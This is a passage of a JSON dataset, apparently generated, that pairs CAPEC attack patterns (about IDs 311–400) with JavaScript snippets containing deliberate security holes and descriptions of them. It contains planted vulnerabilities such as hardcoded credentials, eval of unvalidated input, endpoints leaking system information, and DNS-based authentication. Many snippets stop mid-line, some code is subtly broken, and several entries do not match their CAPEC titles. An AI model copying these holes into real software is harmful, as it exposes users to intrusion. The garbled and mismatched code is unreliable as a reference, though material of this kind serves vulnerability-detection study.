        "code_snippet": "function debugInterface() {\n    // Debug interface with weak access control\n    const debugEnabled = true;\n    const internalRegisters = {\n        protected: { value: 'sensitive_data' },\n        unprotected: { value: 'public_data' }\n    };\n\n    function accessRegister(address) {\n        // No proper authentication check\n        if (debugEnabled) {\n            // Overlapping memory regions allowing bypass\n            if (address >= 0x1000 && address <= 0x2000) {\n                return internalRegisters.protected.value;\n            }\n            return internalRegisters.unprotected.value;\n        }\n    }\n\n    // Debug logging without proper access control\n    console.debug('Debug mode active, registers accessible');\n    return accessRegister(0x1500);\n}",
        "description": "This code demonstrates vulnerable debug interface implementation with improper access control, overlapping memory regions, and exposed debug information. It allows unauthorized access to protected registers through debug interfaces and lacks proper authentication mechanisms."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "`\nconst http = require('http');\nconst os = require('os');\n\nconst server = http.createServer((req, res) => {\n    if(req.url === '/system-info') {\n        const systemInfo = {\n            platform: os.platform(),\n            release: os.release(),\n            type: os.type(),\n            version: os.version(),\n            arch: os.arch(),\n            hostname: os.hostname(),\n            userInfo: os.userInfo()",
        "description": "\"This vulnerable code creates an HTTP server that exposes detailed system information through an unprotected endpoint. It directly returns sensitive OS and system details including platform type, version, architecture, and user information in cleartext without any authentication or access control, making it easy for attackers to fingerprint the system.\""
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n    socket.write('Welcome to Server v1.2.3 (Linux 4.15.0)\\n');\n    socket.on('data', (data) => {\n        const clientInfo = {\n            os: process.platform,\n            version: process.version,\n            arch: process.arch,\n            systemPath: process.env.PATH,\n            systemRoot: process.env.SystemRoot,\n            userDomain: process.env.USERDOMAIN\n        };\n        socket.write(JSON.stringify(clientInfo));\n    });\n}).listen(3000);",
        "description": "This code creates a server that leaks sensitive system information through banner messages and responses, making it vulnerable to passive OS fingerprinting. It exposes detailed system information including OS type, version, architecture, and environment variables in cleartext, allowing attackers to gather system intelligence without active probing."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "`\nfunction debugLogger(data, isSecure) {\n  const traceData = {\n    timestamp: Date.now(),\n    debug: data,\n    source: 'system'",
        "description": "\"This code demonstrates multiple security vulnerabilities including improper management of sensitive trace data, authentication bypass through DNS lookups, and overlapping protected/unprotected memory regions. The code insecurely stores debug logs in localStorage, relies on DNS lookups for security decisions, and creates overlapping memory regions that could allow unauthorized access to protected data.\""
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "// Authentication module with capture-replay vulnerability\nconst authTokens = new Set();\n\nconst authenticate = (token) => {\n    // Simplified authentication that's vulnerable to replay attacks\n    if (authTokens.has(token)) {\n        return true;\n    }\n    \n    // Validate token against server (simulated)\n    if (validateWithServer(token)) {\n        authTokens.add(token);\n        return true;\n    }\n    return false;\n}\n\nconst validateWithServer = (token) => {\n    // Debug log exposing sensitive information\n    console.log(`Authentication attempt with token: ${token}`);\n    \n    // Non-ubiquitous API usage\n    if (typeof window.crypto.subtle === 'undefined') {\n        return false;\n    }\n    \n    // DNS lookup in security decision\n    const serverResponse = checkDNS('auth.example.com');\n    return serverResponse.status === 'valid';\n}",
        "description": "This code demonstrates multiple security vulnerabilities including a capture-replay authentication weakness, debug information exposure, non-ubiquitous API usage, and reliance on DNS lookups for security decisions. The authentication system stores tokens in memory and can be exploited by replaying captured tokens."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "function checkUserAccess(hostname) {\n  const dns = require('dns');\n  dns.lookup(hostname, (err, address) => {\n    // Vulnerable: relying on DNS for security decision\n    if (address === '10.0.0.1') {\n      grantAdminAccess();\n    }\n  });\n\n  // Debug logging exposing sensitive info\n  console.log(`Debug: Auth attempt from ${hostname}`);\n}\n\nfunction grantAdminAccess() {\n  // Bypass authentication by DNS spoofing possible\n  process.env.ADMIN_TOKEN = 'authenticated';\n  return true;\n}",
        "description": "This code demonstrates multiple security vulnerabilities including authentication bypass through DNS lookup reliance, sensitive information exposure through debug logging, and insecure authentication mechanisms. The code makes security decisions based on DNS lookups which can be spoofed, and exposes sensitive authentication attempts through debug logs."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "function fingerPrintOS(targetHost) {\n    let ipIds = [];\n    let tcpIds = [];\n    let icmpIds = [];\n\n    // Collect IP IDs from different protocols\n    function collectIds() {\n        let socket = require('net').Socket();\n        let raw = require('raw-socket');\n\n        // Bind to same port multiple times (vulnerable)\n        socket.bind(12345);\n        socket.bind(12345);\n\n        // Store sequence of IP IDs from responses\n        socket.on('message', (msg, rinfo) => {\n            if(rinfo.address === targetHost) {\n                ipIds.push(msg.readUInt16BE(4));\n                if(msg[9] === 6) tcpIds.push(msg.readUInt16BE(4));\n                if(msg[9] === 1) icmpIds.push(msg.readUInt16BE(4));\n            }\n        });\n\n        // Analyze ID patterns to determine OS\n        return analyzeSequence(ipIds, tcpIds, icmpIds);\n    }\n\n    function analyzeSequence(ipIds, tcpIds, icmpIds) {\n        // Vulnerable authentication using IP\n        if(socket.remoteAddress === targetHost) {\n            return {\n                os: determineOS(ipIds),\n                ipSequence: calculateSequence(ipIds),\n                sharedSequence: compareSequences(tcpIds, icmpIds)\n            };\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable OS fingerprinting implementation that analyzes IP ID sequence numbers across multiple protocols. It contains multiple security issues including binding to the same port multiple times, relying on IP addresses for authentication, and exposing system information through IP ID sequence analysis. The code collects and analyzes IP ID sequences from TCP and ICMP protocols to determine the target system's operating system."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "function probeIPIdentification(targetHost, targetPort) {\n    const dgram = require('dgram');\n    const client = dgram.createSocket('udp4');\n    \n    const packet = Buffer.alloc(20);\n    // Set arbitrary IP ID value in packet header\n    packet.writeUInt16BE(0xABCD, 4);\n    \n    client.send(packet, targetPort, targetHost, (err) => {\n        if (err) {\n            console.error(err);\n            return;\n        }\n    });\n    \n    client.on('message', (msg, rinfo) => {\n        // Extract and compare ID field from ICMP response\n        const responseId = msg.readUInt16BE(4);\n        const osType = (responseId === 0xCDAB) ? 'OS_TYPE_A' : 'OS_TYPE_B';\n        // Store sensitive system identification data\n        global.systemInfo = {\n            host: targetHost,\n            fingerprint: osType,\n            rawResponse: msg\n        };\n    });\n}",
        "description": "Vulnerable code that implements OS fingerprinting by sending UDP packets with specific IP ID values and analyzing how the target system echoes back these values in ICMP error messages. The code exposes sensitive system information through global storage and lacks proper protection of trace data."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "`\nconst net = require('net');\nconst raw = require('raw-socket');\n\nfunction probeOSFingerprint(targetIP) {\n    // Create raw socket with DF bit set\n    const socket = raw.createSocket({\n        protocol: raw.Protocol.UDP,\n        df: true  // Set Don't Fragment bit",
        "description": "\"This code performs OS fingerprinting by sending UDP packets with the DF (Don't Fragment) bit set and analyzing the responses. It contains multiple vulnerabilities: exposing sensitive system information through debug mode, incorrect network destination handling, improper trace data management, and exposing diagnostic functionality in production. The code stores and transmits collected fingerprint data without proper protection.\""
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "`\nconst net = require('net');\n\nfunction probeTCPTimestamps(target, port) {\n    let timestamps = [];\n    const client = new net.Socket();\n\n    client.connect(port, target, () => {\n        // Send multiple probes to collect timestamps\n        for(let i = 0; i < 5; i++) {\n            client.write('PROBE');\n            setTimeout(() => {",
        "description": "\"This code implements a TCP timestamp fingerprinting technique that exploits timestamp patterns in TCP headers to identify the target system's operating system. It connects to a target host, sends multiple probes, collects TCP timestamp responses, and analyzes the intervals between timestamps to determine the operating system. Different OS implementations update TCP timestamps at different intervals, making this a reliable fingerprinting method. The code exposes sensitive system information (CWE-200) and creates a covert timing channel (CWE-385).\""
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    let seqNumber = Date.now(); // Predictable seed for sequence number\n    \n    socket.on('data', (data) => {\n        // Parse incoming TCP packet\n        const ackNumber = data.readUInt32BE(8);\n        \n        // Create response with predictable sequence number\n        const response = Buffer.alloc(20);\n        response.writeUInt32BE(seqNumber, 0); // Sequence number\n        response.writeUInt32BE(ackNumber + 1, 4); // Acknowledgment number\n        \n        socket.write(response);\n    });\n});\n\n// Multiple binds possible, making port stealing easier\nserver.listen(80, '0.0.0.0');\nserver.listen(80, '127.0.0.1');",
        "description": "This code creates a TCP server that uses predictable sequence numbers based on timestamp, making OS fingerprinting possible. It exposes system information through TCP sequence number patterns and allows multiple binds to the same port. The sequence numbers are generated in a predictable manner and transmitted in cleartext."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "function probeOperatingSystem(targetIP, targetPort) {\n    let sequenceNumbers = [];\n    let probeCount = 5;\n    \n    for(let i = 0; i < probeCount; i++) {\n        let socket = new WebSocket(`ws://${targetIP}:${targetPort}`);\n        \n        socket.onopen = () => {\n            // Store TCP sequence numbers in cleartext\n            let seqNum = socket._socket.remoteAddress;\n            sequenceNumbers.push(seqNum);\n            \n            // Analyze sequence number increment pattern\n            if (sequenceNumbers.length === probeCount) {\n                let increment = sequenceNumbers[1] - sequenceNumbers[0];\n                \n                // Expose OS fingerprint data in plaintext\n                let systemInfo = {\n                    'os_type': determineOS(increment),\n                    'kernel_version': getKernelVersion(increment),\n                    'tcp_implementation': getTCPStack(sequenceNumbers)\n                };\n                \n                // Store sensitive system data without encryption\n                localStorage.setItem('system_fingerprint', JSON.stringify(systemInfo));\n            }\n        };\n    }\n}",
        "description": "This code demonstrates a vulnerable OS fingerprinting implementation that collects TCP sequence numbers through WebSocket connections, analyzes them to determine the target system's characteristics, and stores the sensitive information in cleartext. The code exposes system information through unprotected storage and transmission, fails to implement proper access controls, and stores sensitive trace data in an insecure manner."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "`\nconst measureSequenceRate = async (targetHost) => {\n    let sequenceNumbers = [];\n    let startTime = performance.now();\n    \n    for(let i = 0; i < 100; i++) {\n        try {\n            let response = await fetch(targetHost);\n            let tcpHeader = response.headers.get('tcp-seq');  // Hypothetical header\n            sequenceNumbers.push(parseInt(tcpHeader));",
        "description": "\"This code demonstrates a timing analysis attack that measures TCP sequence number increment rates to fingerprint operating systems. It exploits predictable time-based sequence number generation by collecting samples, calculating the increment rate, and matching it against known OS patterns. The code contains race conditions and timing channels that could expose sensitive system information.\""
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "function generateSequenceNumber() {\n  const processId = process.pid;\n  const timestamp = Date.now();\n  let seed = processId + timestamp;\n  \n  // Poor random number generation using predictable values\n  const sequenceNumber = (seed * 1103515245 + 12345) & 0x7fffffff;\n  \n  // Exposing system information in error messages\n  try {\n    if (sequenceNumber < 0) {\n      throw new Error(`Invalid sequence: PID=${processId}, Time=${timestamp}`);\n    }\n  } catch (error) {\n    console.error(error.message);\n  }\n  \n  return sequenceNumber;\n}\n\nfunction generateTCPSequence() {\n  const numbers = [];\n  for(let i = 0; i < 1000; i++) {\n    numbers.push(generateSequenceNumber());\n  }\n  return numbers;\n}",
        "description": "This code demonstrates a vulnerable sequence number generation system that uses predictable values (process ID and timestamp) as seeds. It exposes system information in error messages and implements a weak pseudo-random number generator algorithm that could be analyzed for patterns. The sequence numbers generated could be predicted by an attacker through statistical analysis, potentially revealing the system's operating characteristics."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "function probeECNSupport(targetHost) {\n    const net = require('net');\n    const socket = new net.Socket();\n\n    socket.connect(80, targetHost, () => {\n        // Send TCP packet with ECN flags set\n        const rawSocket = socket._handle;\n        if (rawSocket) {\n            // Set ECN bits in TCP header (non-standard socket manipulation)\n            rawSocket.setNoDelay(true);\n            const data = Buffer.from('GET / HTTP/1.1\\r\\n');\n            socket.write(data);\n\n            // Store response characteristics without encryption\n            let hostInfo = {\n                ecnSupport: false,\n                osType: '',\n                congestionResponse: ''\n            };\n\n            socket.on('data', (response) => {\n                // Analyze ECN response without validation\n                hostInfo.ecnSupport = (response[0] & 0x40) !== 0;\n                hostInfo.congestionResponse = response.toString();\n                \n                // Broadcast findings without restriction\n                socket.emit('probe-result', hostInfo);\n            });\n        }\n    });\n}",
        "description": "This code performs OS fingerprinting by probing ECN support, containing multiple vulnerabilities: it transmits sensitive system information in cleartext, lacks input validation and integrity checks, allows unrestricted network message volume, and broadcasts system information without proper access controls. The code manipulates low-level TCP headers to test ECN support and exposes system characteristics through unprotected channels."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "`\nfunction probeOSFingerprint(targetHost, port) {\n    let socket = new WebSocket('ws://' + targetHost + ':' + port);\n    let tcpWindowSizes = new Uint32Array(1024);\n    let windowIndex = 0;\n\n    socket.onopen = function() {\n        // Send large payload to test window size\n        let payload = new Array(65535).fill('A').join('');\n        socket.send(payload);",
        "description": "\"This code demonstrates an OS fingerprinting technique by probing TCP window sizes through WebSocket connections. It contains multiple vulnerabilities including buffer overflow risks (CWE-121), exposure of system information (CWE-200), unsafe buffer access (CWE-806), and reliance on memory layout assumptions (CWE-188). The code unsafely stores TCP window sizes and exposes OS information through WebSocket messages.\""
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    const osFingerprint = {\n        options: socket.localAddress,\n        windowSize: socket._handle.getWindowSize(),\n        ttl: socket._handle.getTTL(),\n        debug: true\n    };\n\n    // Bind multiple sockets to same port\n    const debugSocket = new net.Socket();\n    debugSocket.bind(socket.localPort);\n\n    // Expose system info through TCP options\n    socket.write(JSON.stringify({\n        systemInfo: process.env,\n        tcpOptions: osFingerprint,\n        debugMode: true,\n        memoryLayout: process.memoryUsage()\n    }));\n}).listen(8080);",
        "description": "This code creates a vulnerable TCP server that leaks operating system information through TCP options and header analysis. It exposes sensitive system data, allows multiple socket binds, and enables debug features during runtime. The server responds with detailed system information including memory layout and environment variables, making OS fingerprinting trivial."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "`\nfunction handleTCPReset(packet) {\n    // Process TCP RST packet with ASCII payload\n    let payload = packet.data;\n    let checksum = packet.checksum;\n    \n    // Insecure: No validation of checksum\n    if (payload && payload.length > 0) {\n        let osDetails = {\n            errorMessage: payload.toString(),\n            systemInfo: process.version,\n            status: 'RST'",
        "description": "\"This vulnerable code processes TCP RST packets containing ASCII payloads without proper checksum validation. It exposes sensitive system information in cleartext responses and logs, making it susceptible to OS fingerprinting. The code lacks integrity checks for incoming packets and transmits system details without encryption, enabling capture-replay attacks and unauthorized information disclosure.\""
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "`\nfunction handleICMPError(errorPacket) {\n    let sensitiveData = {\n        serverIP: '192.168.1.100',\n        credentials: 'admin:password123',\n        databaseInfo: 'mysql://root:secret@localhost:3306/production'",
        "description": "\"This code demonstrates vulnerable ICMP error handling that leaks sensitive system information through error messages. When an ICMP error occurs, the function returns detailed system information including server IP, database credentials, and environment variables in the error response. The code fails to sanitize or limit the amount of quoted data from the original request, potentially exposing sensitive information to unauthorized actors through ICMP error messages.\""
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "`\nconst http = require('http');\nconst ping = require('ping');\nconst crypto = require('crypto');\n\nconst sensitiveData = {\n  username: 'admin',\n  password: 'secret123',\n  apiKey: '1234567890abcdef'",
        "description": "\"This code demonstrates vulnerable handling of ICMP error messages by including sensitive data in error responses, lacking integrity checks, and being susceptible to replay attacks. It exposes system information and credentials in error messages, doesn't implement message verification, and allows capture-replay attacks through unprotected response handling.\""
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nfunction probeSystem(targetIp, targetPort) {\n    const message = Buffer.from('PROBE');\n    \n    client.send(message, targetPort, targetIp, (err) => {\n        if (err) {\n            console.error(err);\n            return;",
        "description": "\"This code demonstrates a vulnerable UDP probe implementation that attempts to gather system information through port unreachable messages. It lacks message integrity checks, transmits data in cleartext, and exposes system information through error messages. The code improperly handles length parameters and reveals internal state information through different response patterns.\""
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "\"const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n    // Echo back system information in error messages\n    const sysInfo = {\n        os: process.platform,\n        version: process.version,\n        hostname: require('os').hostname(),\n        networkInterfaces: require('os').networkInterfaces()",
        "description": "\"This code creates a UDP server that responds to incoming datagrams with detailed error messages containing sensitive system information. When receiving a message on a closed port, it sends back an unencrypted response including OS details, hostname, network interfaces, and request information, making it vulnerable to OS fingerprinting through response analysis.\""
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "// Virtual Sale Event Server\nconst express = require('express');\nconst app = express();\n\nlet eventParticipants = [];\n\napp.get('/join-sale', (req, res) => {\n    const userId = req.query.userId;\n    const username = req.query.username;\n    \n    // Insecure storage of participant data\n    eventParticipants.push({\n        userId: userId,\n        username: username,\n        joinTime: new Date().toISOString()\n    });\n\n    // Transmit participant list in cleartext\n    res.json({\n        status: 'joined',\n        participants: eventParticipants\n    });\n});\n\napp.get('/event-data', (req, res) => {\n    // No authentication check\n    // Exposes all participant data\n    res.json({\n        participants: eventParticipants,\n        totalUsers: eventParticipants.length,\n        userIds: eventParticipants.map(p => p.userId)\n    });\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable virtual sale event system where sensitive user data is transmitted and stored without encryption. The server lacks proper authentication, exposes participant information in cleartext, and allows unrestricted access to user data through unprotected endpoints. The implementation relies on client-side security and doesn't implement proper server-side validation, making it susceptible to data harvesting attacks."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "class MessageProcessor {\n    constructor() {\n        this.trustedClients = new Set();\n    }\n\n    processClientMessage(clientId, message) {\n        // No verification of message authenticity\n        let decodedMessage = decodeURIComponent(message);\n        \n        // Assumes client data is immutable and trustworthy\n        let messageObj = {\n            id: clientId,\n            content: decodedMessage,\n            timestamp: Date.now(),\n            verified: true  // Blindly trusts client input\n        };\n\n        // Sends unencrypted sensitive data\n        this.forwardToServer('http://api.example.com/messages', {\n            method: 'POST',\n            body: JSON.stringify(messageObj)\n        });\n\n        // Client-side security enforcement\n        if (this.trustedClients.has(clientId)) {\n            return this.processPrivilegedOperation(messageObj);\n        }\n    }\n\n    processPrivilegedOperation(messageObj) {\n        // Processes potentially manipulated data without server validation\n        eval(messageObj.content);  // Dangerous execution of unvalidated content\n        return { status: 'success', data: messageObj };\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including insufficient data authenticity verification, client-side security enforcement, missing encryption of sensitive data, and modification of assumed-immutable data. It processes and forwards potentially manipulated messages without proper validation or encryption, and uses dangerous eval() execution."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "// Game Item Exchange System\nclass ItemExchange {\n  constructor() {\n    this.socket = new WebSocket('ws://game-server.com');\n  }\n\n  initiateExchange(itemId, playerId) {\n    let exchangeData = {\n      item: itemId,\n      player: playerId,\n      value: this.getItemValue(itemId),\n      timestamp: Date.now()\n    };\n    \n    // Send unencrypted exchange data\n    this.socket.send(JSON.stringify(exchangeData));\n  }\n\n  getItemValue(itemId) {\n    // Client-side value calculation without server validation\n    return document.getElementById(itemId).getAttribute('data-value');\n  }\n\n  confirmExchange(responseData) {\n    // Accept response without origin verification\n    if(responseData.status === 'success') {\n      this.completeTransaction(responseData);\n    }\n  }\n\n  completeTransaction(data) {\n    // Update local inventory without server validation\n    localStorage.setItem('playerInventory', JSON.stringify(data.inventory));\n  }\n}",
        "description": "This vulnerable code demonstrates an insecure item exchange system where data authenticity isn't verified, sensitive transaction data isn't encrypted, and critical game values are stored and calculated client-side. The code allows for man-in-the-middle attacks where transaction data can be modified during transmission, leading to fraudulent exchanges."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "// Client-side link handling code\nfunction updateNavigationLinks() {\n    let links = document.querySelectorAll('a.trusted-link');\n    let userData = localStorage.getItem('user_preferences');\n    \n    links.forEach(link => {\n        // Vulnerable: No validation of link destination\n        let newUrl = link.getAttribute('data-redirect') || link.href;\n        \n        // Vulnerable: Client-side only verification\n        if (userData && JSON.parse(userData).trustedDomains) {\n            link.href = newUrl;\n        }\n        \n        link.addEventListener('click', (e) => {\n            // Vulnerable: No origin validation\n            let destination = e.target.getAttribute('data-dynamic-url') || newUrl;\n            // Vulnerable: Unencrypted data transmission\n            window.location.href = destination;\n        });\n    });\n}",
        "description": "A vulnerable JavaScript code that allows client-side manipulation of link destinations without proper validation, verification, or encryption. The code trusts client-side data for link redirection, lacks origin validation, and stores sensitive data in localStorage without encryption."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "// Client-side JavaScript code\nconst userRole = localStorage.getItem('userRole');\nconst userPoints = localStorage.getItem('points');\n\nfunction processUserTransaction() {\n    // Send unencrypted data to server\n    fetch('/api/process-transaction', {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json'\n        },\n        body: JSON.stringify({\n            role: userRole,       // Relies on client-side role\n            points: userPoints,   // Points can be modified locally\n            userId: 123,\n            amount: 1000\n        })\n    });\n}",
        "description": "This code demonstrates vulnerable client-side security enforcement where sensitive user role and points data are stored in localStorage and can be easily modified. The server endpoint relies on these client-side values without proper verification, and sensitive transaction data is transmitted without encryption. An attacker can manipulate the local storage values to escalate privileges or modify transaction amounts."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "// Frontend code handling button destinations and messages\nconst buttonData = {\n  text: 'Click to Login',\n  destination: 'https://legitimate-site.com/login',\n  messageContent: 'Welcome to our secure platform'\n};\n\nfunction updateButton(data) {\n  const button = document.getElementById('actionButton');\n  button.textContent = data.text;\n  button.onclick = function() {\n    window.location.href = data.destination;\n  };\n  document.getElementById('message').innerHTML = data.messageContent;\n}\n\n// Vulnerable API endpoint handling\nfunction processAPIResponse(response) {\n  // No validation of response origin or authenticity\n  updateButton(response.data);\n}\n\n// Making API call without data encryption\nfetch('api/button-config')\n  .then(response => response.json())\n  .then(data => processAPIResponse(data));",
        "description": "This vulnerable code demonstrates button manipulation through unvalidated API responses. It lacks origin validation, data authenticity checks, and proper encryption. The client-side code blindly trusts and processes incoming button configuration data, allowing an attacker to modify button destinations and content through manipulated API responses."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "`\n    // Client-side authentication implementation\n    class ClientAuthenticator {\n      constructor() {\n        this.authToken = null;",
        "description": "\"This code demonstrates multiple vulnerabilities including client-side only authentication, lack of message integrity checks, and susceptibility to replay attacks. The authentication token is stored in localStorage and can be manipulated. Messages are sent without proper integrity verification, allowing content spoofing. The timestamp implementation doesn't prevent replay attacks effectively.\""
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "`\n    class SecuritySystem {\n      constructor() {\n        this.isLocked = true;\n        this.voltage = 12;\n        this.emissionLevel = 0;\n        this.alarmEnabled = true;",
        "description": "\"A vulnerable physical security system implementation that fails to properly protect against voltage glitches, electromagnetic interference, and side-channel attacks. The code demonstrates weak physical access controls and improper protection of system states and alert mechanisms, allowing potential bypasses through voltage manipulation and EM interference.\""
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "`\nclass SecuritySystem {\n  constructor() {\n    this.locked = true;\n    this.debugMode = false;\n    this.lockBit = 1;\n    this.registers = new Map();",
        "description": "\"This code represents a vulnerable security system implementation that demonstrates multiple physical access control weaknesses. It includes insufficient lock bit protection, debug mode bypasses, improper external lock control, and inadequate register protection mechanisms.\""
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "`class SecurityLock {\n    constructor() {\n        this.lockBit = false;\n        this.KEY = \"0xDEADBEEF\"; // Hardcoded master key\n        this.failedAttempts = 0;\n        this.isLocked = false;",
        "description": "\"This code represents a vulnerable digital lock implementation that mirrors physical lock bumping. It contains multiple security flaws including modifiable lock bits, insecure power state transitions, hardcoded master keys, and a bypass mechanism similar to bump key attacks. The lock can be compromised through direct bit manipulation or by using a special 'bump key' value.\""
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "`\nclass SecurityLock {\n  constructor() {\n    this.lockBit = false;\n    this.isInitialized = false;\n    this.resources = new Map();",
        "description": "\"This code represents a security lock implementation with multiple vulnerabilities: modifiable lock bits after initialization, unrestricted external lock control, unlocking of unlocked resources, and potential deadlocks in synchronized access. It mimics a physical lock system where security controls can be bypassed through improper lock management.\""
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "`\nconst Lock = {\n    pins: new Array(5).fill({ driver: 0, key: 0",
        "description": "\"This code simulates a vulnerable electronic lock system that can be exploited through simultaneous manipulation of lock pins, similar to a physical snap gun attack. It includes vulnerabilities such as deadlock potential, improper lock bit protection, use of a default master key, and incorrect lock behavior after power state transitions.\""
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "class ElectronicAccessControl {\n  constructor() {\n    this.masterKey = '0xDEADBEEF'; // Hard-coded crypto key\n    this.encryptionAlgorithm = 'DES'; // Outdated crypto algorithm\n  }\n\n  verifyRFIDCard(cardData) {\n    // Simple XOR encryption with static key\n    const encryptedData = cardData.split('').map(char =>\n      String.fromCharCode(char.charCodeAt(0) ^ this.masterKey.charCodeAt(0))\n    ).join('');\n    \n    // No protection against timing attacks\n    return encryptedData === this.getStoredCardData();\n  }\n\n  getStoredCardData() {\n    // Storing sensitive data in plaintext\n    return 'VALID_CARD_DATA';\n  }\n\n  authenticateUser(cardId, pin) {\n    // No rate limiting or protection against brute force\n    if (this.verifyRFIDCard(cardId)) {\n      return true;\n    }\n    return false;\n  }\n}",
        "description": "This code demonstrates vulnerable electronic access control implementation with hard-coded cryptographic keys, weak encryption (DES/XOR), no protection against timing attacks or electromagnetic side channels, and storage of sensitive data in plaintext. The authentication mechanism is susceptible to card cloning and replay attacks."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "`\n// Insecure authentication system using weak encryption\nconst crypto = require('crypto');\n\nclass PaymentSystem {\n  constructor() {\n    this.cardData = new Map();",
        "description": "\"This code demonstrates vulnerable authentication in a payment card system. It uses weak DES encryption with a static key, lacks protection against replay attacks, and implements vulnerable token verification. The system is susceptible to card cloning, capture-replay attacks, and cryptographic weaknesses as described in the CWEs.\""
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "class MagneticCard {\n  constructor(cardNumber, ownerName, accessCode) {\n    this.cardNumber = cardNumber;\n    this.ownerName = ownerName;\n    // Weak encryption using simple XOR\n    this.accessCode = this.encryptData(accessCode);\n  }\n\n  encryptData(data) {\n    const key = 'secretkey';\n    return data.split('').map((char, i) =>\n      String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))\n    ).join('');\n  }\n\n  clone() {\n    return Object.assign(new MagneticCard(), this);\n  }\n\n  validateAccess(facility) {\n    return true; // No proper validation implemented\n  }\n}\n\n// Example of vulnerable card duplication\nconst originalCard = new MagneticCard('12345', 'John Doe', 'A123');\nconst clonedCard = originalCard.clone();",
        "description": "This code represents a vulnerable magnetic card implementation that allows unrestricted cloning of access cards. It uses weak encryption (simple XOR), implements a clone method that exposes sensitive data, and lacks proper access validation. The card data can be easily duplicated, similar to physical magnetic stripe card cloning."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "`// Card reader and authentication system\nclass CardSystem {\n    constructor() {\n        this.MASTER_KEY = '1234567890ABCDEF'; // Hard-coded crypto key\n        this.failedAttempts = 0;\n        this.validCards = new Map();",
        "description": "\"This code represents a vulnerable magnetic card system implementation that contains multiple security issues: hard-coded cryptographic keys, weak encryption, lack of authentication attempt limits, and no protection against card cloning or spoofing. The system allows unlimited authentication attempts and uses unsafe cryptographic practices, making it susceptible to brute force attacks and card cloning.\""
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "`\n    class RFIDReader {\n      constructor() {\n        this.validIds = new Map();",
        "description": "\"A vulnerable RFID authentication system that allows card cloning due to weak signal verification, improper security identifier handling, and duplicate ID acceptance. The system lacks protection against electromagnetic attacks and implements basic signal processing without proper security measures.\""
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "`\n    class RFIDReader {\n      constructor() {\n        this.isEnabled = true;\n        this.debug = true;\n        this.alerts = true;\n        this.securityIdentifiers = new Map();",
